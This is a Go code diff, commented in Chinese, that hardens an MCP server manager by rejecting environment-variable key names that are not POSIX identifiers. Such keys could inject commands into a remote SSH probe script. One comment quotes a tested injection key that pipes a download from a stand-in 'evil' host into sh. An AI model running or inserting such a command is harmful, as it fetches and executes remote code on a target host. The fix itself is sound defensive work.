@@ -49,6 +49,93 @@ const (
 
 var mcpServerNamePattern = regexp.MustCompile(`^[A-Za-z0-9_-]+$`)
 
+// mcpEnvKeyPattern 约束 MCP 环境变量的**键名**：POSIX 标识符，与
+// validateRunEnvironmentVariables 的判据同一份纪律。
+//
+// 为什么必须单独校验键名：远端（SSH）stdio 探针没有安全 env 通道，env 是以
+// `env KEY=VAL` 前缀**内联进交给远端 sh 的脚本**的（见 buildRemoteStdioProbeCommand）。
+// 值有 shellQuote 保护，键没有——也**不可能有**：`env 'a b'=v` 本身就非法，加引号救不了。
+// 于是一个含 `;` 的键会截断脚本并在目标主机上执行注入命令（2026-09-29 实测，键
+// `x;curl http://evil/p|sh;#` 解出的脚本是：
+//
+//	env NORMAL='ok' x;curl http://evil/p|sh;#='1' 'echo'
+//
+// ）。"调用方本就能自选 command"不是理由：**导入**路径的 env 键来自第三方配置 JSON，
+// 用户在界面上只会审阅 command，不会去逐字看环境变量的键名。
+//
+// 四道闸门都引用它，各有各的职责，缺一不可：
+//  1. mcpServerInput.validate —— 建/改接口，早退并给 400；
+//  2. persistImportedCandidate —— 导入路径**不过 validate**（它的 validate 跑在填 Env 之前），
+//     而且它会把 buildStoredMaps 的错误统一压成"凭据无法保存"，点名不了是哪个键；
+//  3. buildStoredMaps —— 三个写入路径的唯一咽喉，兜住将来新增的写入方；
+//  4. probeMCPServer —— 真正的安全边界（库里可能存着本次修复之前写进去的键，草稿压根不落库）。
+//
+// ⚠️ 这条判据**比"防注入"所需更严**：真正要挡的只是空白、`=`、NUL 与 shell 元字符，
+// 而 `env MY-KEY='v'` 在 POSIX 里本来是合法的（只有 `export`/赋值才要求标识符）。
+// 之所以仍按 POSIX 标识符收口，是因为**将来可能新增把键当变量名用的路径**
+// （`export`、`${VAR}` 占位符、各平台 env 语义…），而一处放宽就得把每一条路径的
+// 安全性重新推一遍 —— 这一批修复的教训正是"某个路径上的假设会静默失效"。
+// 代价是先前能用的 `MY-KEY` 这类键会被拒（并**点名**那个键），这是有意的取舍。
+var mcpEnvKeyPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*$`)
+
+// normalizeMCPEnvKeys 返回键名去掉首尾空白的副本（空输入返回 nil）。
+//
+// 口径必须跟写入路径（buildStoredMaps 里的 `key = strings.TrimSpace(key)`）：探针若用
+// 原样的键，草稿里一个带空格的键会让远端脚本变成 `env   TOKEN  ='v'`，报一句
+// `env: 'TOKEN': No such file or directory` —— 用户完全看不出是键名带空格。
+//
+// ⚠️ 归一化会**折叠同名键**（`{"TOKEN":"a"," TOKEN ":"b"}` 只剩一个）。这里按原始键名
+// 排序后取第一个，让结果**可复现**：不加这一步的话取哪个值由 map 迭代顺序决定
+// （Go 每次随机），同一次探测重试两次可能用不同的值，排查时无从复现。
+// （写入路径同样会折叠，所以探针与库里的口径一致；折叠本身是用户配置有歧义，不是我们的错。）
+func normalizeMCPEnvKeys(values map[string]string) map[string]string {
+	if len(values) == 0 {
+		return nil
+	}
+	originals := make([]string, 0, len(values))
+	for key := range values {
+		originals = append(originals, key)
+	}
+	sort.Strings(originals)
+	out := make(map[string]string, len(values))
+	for _, key := range originals {
+		out[strings.TrimSpace(key)] = values[key]
+	}
+	return out
+}
+
+// invalidMCPEnvKeys 返回不合法的键名（按归一化后的形态判、已排序，便于稳定报错与断言）。
+// 合法返回 nil。
+func invalidMCPEnvKeys(values map[string]string) []string {
+	var bad []string
+	for key := range normalizeMCPEnvKeys(values) {
+		if !mcpEnvKeyPattern.MatchString(key) {
+			bad = append(bad, key)
+		}
+	}
+	sort.Strings(bad)
+	return bad
+}
+
+// mcpEnvKeyError 把非法键名转成一条可读结论（四个闸门共用，措辞只此一份）。
+func mcpEnvKeyError(values map[string]string) error {
+	bad := invalidMCPEnvKeys(values)
+	if len(bad) == 0 {
+		return nil
+	}
+	// 空键在文案里给一个看得懂的标签：直接拼会出现"环境变量名不合法：。"
+	labels := make([]string, 0, len(bad))
+	for _, key := range bad {
+		if key == "" {
+			labels = append(labels, "（空）")
+			continue
+		}
+		labels = append(labels, key)
+	}
+	return fmt.Errorf("环境变量名不合法：%s。只允许字母、数字与下划线，且不能以数字开头"+
+		"（远端探测会把环境变量内联进 shell 脚本，键名必须是合法的 POSIX 变量名）", strings.Join(labels, "、"))
+}
+
 // mcpServer 是一条 MCP server 定义。密钥字段（Env/Headers 中）在库内统一存 sec_ 引用，
 // 明文只在写入瞬间存在，读取与列表接口永不回显明文。
 type mcpServer struct {
@@ -286,12 +373,29 @@ func (input mcpServerInput) validate() error {
 	if len(input.Agents) == 0 {
 		return errors.New("MCP server 至少需要指定一个 Agent")
 	}
-	return nil
+	// 环境变量**键名**必须在写入这一刻就挡住：它会被内联进远端探针的 shell 脚本
+	// （见 mcpEnvKeyPattern）。明文与密文两组键都要查——密文的键同样会当环境变量名用。
+	//
+	// 注意它也会挡住**老数据**的再保存：库里若存着本次修复之前写进去的非法键（例如更早的
+	// 导入带进来的），用户改这个 server 时会被拦下并看到那个键的名字 —— 这是有意的：
+	// 那一行本来就发不出去（探针闸门也会拒），改名之后一切照旧。
+	if err := mcpEnvKeyError(input.Env); err != nil {
+		return err
+	}
+	return mcpEnvKeyError(input.EnvSecrets)
 }
 
 // buildStoredMaps 把明文密钥加密为 sec_ 引用后并入 env/headers。
 // 已有 sec_ 引用原样保留；明文覆盖同名引用。
 func (s *Server) buildStoredMaps(ctx context.Context, q secretQueryer, env, headers, envSecrets, headerSecrets map[string]string) (map[string]string, map[string]string, []string, error) {
+	// 三个写入路径（建 / 改 / 导入）的唯一咽喉：键名不合法在这里就挡住，将来新增写入方
+	// 也自动被兜住。必须挡的原因见 mcpEnvKeyPattern —— 键名会被内联进远端探针的 shell 脚本。
+	if err := mcpEnvKeyError(env); err != nil {
+		return nil, nil, nil, err
+	}
+	if err := mcpEnvKeyError(envSecrets); err != nil {
+		return nil, nil, nil, err
+	}
 	stored := map[string]string{}
 	for key, value := range env {
 		key = strings.TrimSpace(key)
@@ -758,6 +862,13 @@ func (s *Server) deleteMCPServer(w http.ResponseWriter, r *http.Request) {
 		writeError(w, http.StatusInternalServerError, err)
 		return
 	}
+	// 先吊销 OAuth 令牌、再删行：吊销失败时 500 中止，什么都没发生、可重试；
+	// 反过来（先删行）失败会让前端拿着「删除失败」的报错去找一条已经不存在的记录。
+	// ErrNoRows（本来就没有令牌）不算错。
+	if err := s.revokeMCPOAuthToken(ctx, serverID); err != nil {
+		writeError(w, http.StatusInternalServerError, err)
+		return
+	}
 	if _, err := s.db.ExecContext(ctx, `delete from mcp_servers where id=?`, serverID); err != nil {
 		writeError(w, http.StatusInternalServerError, err)
 		return
@@ -911,9 +1022,12 @@ type mcpPreset struct {
 }
 
 // 目录分组。
+//
+// 「本机运行」分组（filesystem / playwright / fetch / memory / context7 / github-local）
+// 已暂时下线（2026-09-24）：先只做远程托管形态。mcpLocalPreset 与运行时依赖声明随之一并
+// 移除；恢复时按 docs/34 §26 记录的形状重建（stdio + requires 诚实声明 + 凭据落点）。
 const (
 	mcpPresetCategoryCommon = "常用服务"
-	mcpPresetCategoryLocal  = "本机运行"
 )
 
 // mcpGitHubRemoteURL 是 GitHub 官方托管的远程 MCP server。
@@ -946,20 +1060,7 @@ func mcpRemotePreset(id, name, display, summary, icon, rawURL string, oauth bool
 	}
 }
 
-// mcpLocalPreset 造一条「在目标环境拉起进程」目录条目。
-func mcpLocalPreset(id, name, display, summary, icon, command string, args []string, requires []mcpPresetRequirement, credentials []mcpPresetCredential, docsURL string) mcpPreset {
-	return mcpPreset{
-		ID: id, Name: name, DisplayName: display,
-		Description: summary, Summary: summary,
-		Category: mcpPresetCategoryLocal, Icon: icon,
-		Transport: mcpTransportStdio, Command: command, Args: args,
-		Environments: mcpPresetEnvironmentsAll(),
-		Requires:     requires, Credentials: credentials, DocsURL: docsURL,
-	}
-}
-
 func mcpPresetCatalog() []mcpPreset {
-	node := []mcpPresetRequirement{{Command: "npx", Label: "Node.js", Hint: "npx 随 Node.js 一起安装，Windows / WSL / 远端各自独立，需分别安装。"}}
 	githubToken := []mcpPresetCredential{{
 		Key: "Authorization", Target: mcpPresetCredentialHeader, Label: "GitHub Personal Access Token",
 		ValuePrefix: "Bearer ",
@@ -968,6 +1069,7 @@ func mcpPresetCatalog() []mcpPreset {
 	}}
 
 	// 「常用服务」：远程托管 + OAuth，用户只需点一次浏览器授权（或填一个凭据）。
+	// 2026-09-24 起「本机运行」分组暂时下线（先只做远程托管），见目录分组处的注释。
 	common := []mcpPreset{
 		mcpRemotePreset("notion", "notion", "Notion", "读写你的 Notion 页面与数据库", "docs",
 			"https://mcp.notion.com/mcp", true, nil, "https://developers.notion.com/docs/mcp"),
@@ -990,37 +1092,7 @@ func mcpPresetCatalog() []mcpPreset {
 			}}, "https://docs.stripe.com/mcp"),
 	}
 
-	// 「本机运行」：需要在目标环境装一个运行时。仍然进目录（用户可能就是要它），
-	// 但不占「一键连接」的主推位 —— 依赖是否满足由运行时检查实答。
-	local := []mcpPreset{
-		mcpLocalPreset("filesystem", "filesystem", "项目文件", "让 AI 读写这个项目里的文件", "files",
-			"npx", []string{"-y", "@modelcontextprotocol/server-filesystem", "${PROJECT_DIR}"}, node, nil,
-			"https://github.com/modelcontextprotocol/servers/tree/main/src/filesystem"),
-		mcpLocalPreset("playwright", "playwright", "浏览器", "让 AI 操作网页（打开、点击、截图）", "browser",
-			"npx", []string{"-y", "@playwright/mcp@latest"},
-			[]mcpPresetRequirement{{Command: "npx", Label: "Node.js", Hint: "首次运行会下载浏览器内核，耗时较长。"}}, nil,
-			"https://github.com/microsoft/playwright-mcp"),
-		mcpLocalPreset("fetch", "fetch", "网页抓取", "让 AI 直接读网页内容", "browser",
-			"uvx", []string{"mcp-server-fetch"},
-			[]mcpPresetRequirement{{Command: "uvx", Label: "uv", Hint: "uvx 来自 uv（Astral），不能用 npx 替代该服务。"}}, nil,
-			"https://github.com/modelcontextprotocol/servers/tree/main/src/fetch"),
-		mcpLocalPreset("memory", "memory", "长期记忆", "让 AI 记住跨会话的信息", "memory",
-			"npx", []string{"-y", "@modelcontextprotocol/server-memory"}, node, nil,
-			"https://github.com/modelcontextprotocol/servers/tree/main/src/memory"),
-		mcpLocalPreset("context7", "context7", "库文档", "查最新版本的库文档", "docs",
-			"npx", []string{"-y", "@upstash/context7-mcp"}, node, nil,
-			"https://github.com/upstash/context7"),
-		mcpLocalPreset("github-local", "github-local", "GitHub（本地容器）", "网络受限时在本地容器里跑 GitHub 工具", "code",
-			"docker", []string{"run", "-i", "--rm", "-e", "GITHUB_PERSONAL_ACCESS_TOKEN", "ghcr.io/github/github-mcp-server"},
-			[]mcpPresetRequirement{{Command: "docker", Label: "Docker", Hint: "Windows / WSL 需 Docker Desktop，远端需已安装 docker 且当前用户可执行。"}},
-			[]mcpPresetCredential{{
-				Key: "GITHUB_PERSONAL_ACCESS_TOKEN", Target: mcpPresetCredentialEnv, Label: "GitHub Personal Access Token",
-				Description: "在下方「环境变量」里填成 GITHUB_PERSONAL_ACCESS_TOKEN=<你的 PAT>，保存时自动加密。推荐最小权限 scope：repo、read:org。",
-				DocsURL:     "https://github.com/settings/tokens",
-			}}, mcpGitHubDocsURL),
-	}
-
-	return append(common, local...)
+	return common
 }
 
 func (s *Server) listMCPPresets(w http.ResponseWriter, r *http.Request) {
